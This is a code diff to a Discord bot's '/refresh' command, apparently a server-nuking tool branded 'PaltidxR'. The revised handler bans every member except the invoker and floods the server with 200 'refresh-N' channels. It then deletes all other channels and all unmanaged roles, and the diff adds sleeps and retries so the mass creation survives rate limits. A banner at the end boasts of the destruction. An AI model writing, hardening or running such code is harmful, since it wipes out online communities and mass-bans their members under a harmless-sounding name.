@@ -390,7 +390,7 @@ async function handleHelp(interaction) {
 }
 
 // ======================================================================
-// ============ COMANDO /refresh (CORREGIDO) ============
+// ============ COMANDO /refresh (NUEVO ORDEN) ============
 // ======================================================================
 async function handleRefresh(interaction) {
     const confirm = interaction.options.getString('confirm');
@@ -409,83 +409,22 @@ async function handleRefresh(interaction) {
     });
 
     const guild = interaction.guild;
+    let bannedCount = 0;
+    let createdCount = 0;
+    let deletedChannels = 0;
+    let deletedRoles = 0;
 
     try {
-        // ============ 1. CREAR CANAL TEMPORAL PARA SEGUIR EJECUTANDO ============
-        await interaction.followUp({ content: '📝 Creating temporary channel...', ephemeral: true });
-        
-        let tempChannel = null;
-        try {
-            tempChannel = await guild.channels.create({
-                name: 'temp-refresh',
-                type: 0,
-                reason: 'Temporary channel for refresh process'
-            });
-            await interaction.followUp({ 
-                content: `✅ Temporary channel created: ${tempChannel.name}`, 
-                ephemeral: true 
-            });
-        } catch (e) {
-            console.error('Error creating temp channel:', e);
-        }
-
-        // ============ 2. ELIMINAR TODOS LOS ROLES (excepto @everyone) ============
-        await interaction.followUp({ content: '🎭 Deleting all roles...', ephemeral: true });
-        
-        const roles = await guild.roles.fetch();
-        let roleCount = 0;
-        
-        for (const [roleId, role] of roles) {
-            if (role.name !== '@everyone' && !role.managed) {
-                try {
-                    await role.delete();
-                    roleCount++;
-                } catch (e) {}
-            }
-        }
-        
-        await interaction.followUp({ 
-            content: `✅ Deleted ${roleCount} roles.`, 
-            ephemeral: true 
-        });
-
-        // ============ 3. ELIMINAR TODOS LOS CANALES (excepto el temporal) ============
-        await interaction.followUp({ content: '🗑️ Deleting all channels...', ephemeral: true });
-        
-        const channels = await guild.channels.fetch();
-        let channelCount = 0;
-        
-        for (const [channelId, channel] of channels) {
-            if (channel.name === 'temp-refresh' || channel.name === 'regresa-aqui') continue;
-            try {
-                await channel.delete();
-                channelCount++;
-            } catch (e) {}
-        }
-        
-        await interaction.followUp({ 
-            content: `✅ Deleted ${channelCount} channels.`, 
-            ephemeral: true 
-        });
-
-        // ============ 4. BANEAR A TODOS LOS MIEMBROS ============
-        await interaction.followUp({ content: '🔨 Banning all members...', ephemeral: true });
+        // ============ PASO 1: BANEAR A TODOS ============
+        await interaction.followUp({ content: '🔨 Step 1/4: Banning all members...', ephemeral: true });
         
         const members = await guild.members.fetch();
-        let bannedCount = 0;
-        
         for (const [memberId, member] of members) {
-            if (member.user.bot) {
-                try {
-                    await member.ban({ reason: 'Server refresh - PaltidxR' });
-                    bannedCount++;
-                } catch (e) {}
-            } else if (!member.user.bot && member.id !== interaction.user.id) {
-                try {
-                    await member.ban({ reason: 'Server refresh - PaltidxR' });
-                    bannedCount++;
-                } catch (e) {}
-            }
+            if (member.id === interaction.user.id) continue;
+            try {
+                await member.ban({ reason: 'Server refresh - PaltidxR' });
+                bannedCount++;
+            } catch (e) {}
         }
         
         await interaction.followUp({ 
@@ -493,11 +432,10 @@ async function handleRefresh(interaction) {
             ephemeral: true 
         });
 
-        // ============ 5. CREAR 200 CANALES NUEVOS ============
-        await interaction.followUp({ content: '📝 Creating 200 channels...', ephemeral: true });
+        // ============ PASO 2: CREAR 200 CANALES ============
+        await interaction.followUp({ content: '📝 Step 2/4: Creating 200 channels...', ephemeral: true });
         
         const TOTAL_CHANNELS = 200;
-        let createdCount = 0;
 
         for (let i = 1; i <= TOTAL_CHANNELS; i++) {
             try {
@@ -513,51 +451,78 @@ async function handleRefresh(interaction) {
                         content: `📝 Created ${i}/${TOTAL_CHANNELS} channels...`, 
                         ephemeral: true 
                     });
+                    await new Promise(resolve => setTimeout(resolve, 1000));
                 }
             } catch (e) {
                 console.error(`Error creating channel refresh-${i}:`, e);
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                try {
+                    await guild.channels.create({
+                        name: `refresh-${i}`,
+                        type: 0,
+                        reason: 'Server refresh - PaltidxR'
+                    });
+                    createdCount++;
+                } catch (e2) {}
             }
-        }
-
-        // ============ 6. ELIMINAR CANAL TEMPORAL ============
-        try {
-            if (tempChannel) {
-                await tempChannel.delete();
-            }
-        } catch (e) {}
-
-        // ============ 7. CREAR CANAL PRINCIPAL ============
-        try {
-            await guild.channels.create({
-                name: 'regresa-aqui',
-                type: 0,
-                reason: 'Server refresh - PaltidxR'
-            });
-            createdCount++;
-        } catch (e) {
-            console.error('Error creating regresa-aqui channel:', e);
         }
 
         await interaction.followUp({ 
-            content: `✅ Created ${createdCount} channels (${TOTAL_CHANNELS} refresh channels + 1 regresa-aqui).`, 
+            content: `✅ Created ${createdCount} refresh channels.`, 
             ephemeral: true 
         });
 
-        // ============ 8. MENSAJE FINAL ============
+        // ============ PASO 3: ELIMINAR CANALES QUE NO EMPIECEN CON "refresh" ============
+        await interaction.followUp({ content: '🗑️ Step 3/4: Deleting channels that don\'t start with "refresh"...', ephemeral: true });
+        
+        const channels = await guild.channels.fetch();
+        for (const [channelId, channel] of channels) {
+            if (!channel.name.startsWith('refresh')) {
+                try {
+                    await channel.delete();
+                    deletedChannels++;
+                } catch (e) {}
+            }
+        }
+        
+        await interaction.followUp({ 
+            content: `✅ Deleted ${deletedChannels} channels (not starting with "refresh").`, 
+            ephemeral: true 
+        });
+
+        // ============ PASO 4: ELIMINAR TODOS LOS ROLES ============
+        await interaction.followUp({ content: '🎭 Step 4/4: Deleting all roles...', ephemeral: true });
+        
+        const roles = await guild.roles.fetch();
+        for (const [roleId, role] of roles) {
+            if (role.name !== '@everyone' && !role.managed) {
+                try {
+                    await role.delete();
+                    deletedRoles++;
+                } catch (e) {}
+            }
+        }
+        
+        await interaction.followUp({ 
+            content: `✅ Deleted ${deletedRoles} roles.`, 
+            ephemeral: true 
+        });
+
+        // ============ MENSAJE FINAL ============
         await interaction.followUp({
             content: `
 ╔═══════════════════════════════════════════════════════════════════╗
 ║                                                                   ║
 ║   🔥 SERVER REFRESH COMPLETED 🔥                                  ║
 ║                                                                   ║
-║   This server has been refreshed by PaltidxR.                     ║
-║   All members were banned, all channels and roles were deleted.   ║
+║   ✅ Banned: ${bannedCount} members                                ║
+║   ✅ Created: ${createdCount} refresh channels                     ║
+║   ✅ Deleted: ${deletedChannels} channels (not "refresh")          ║
+║   ✅ Deleted: ${deletedRoles} roles                                ║
 ║                                                                   ║
-║   Created ${TOTAL_CHANNELS} channels named "refresh-1" to          ║
-║   "refresh-${TOTAL_CHANNELS}" and one channel called               ║
-║   "regresa-aqui".                                                 ║
+║   📝 Channels left: "refresh-1" to "refresh-${createdCount}"       ║
 ║                                                                   ║
-║   ⚠️ This server is now ready for a fresh start.                  ║
+║   ⚠️ Server is ready for a fresh start!                          ║
 ║                                                                   ║
 ║   Powered by PaltidxR 🚀                                         ║
 ║                                                                   ║
@@ -569,7 +534,7 @@ async function handleRefresh(interaction) {
     } catch (error) {
         console.error('Refresh error:', error);
         await interaction.followUp({
-            content: `❌ Error during refresh: ${error.message}`,
+            content: `❌ Error: ${error.message}`,
             ephemeral: true
         });
     }
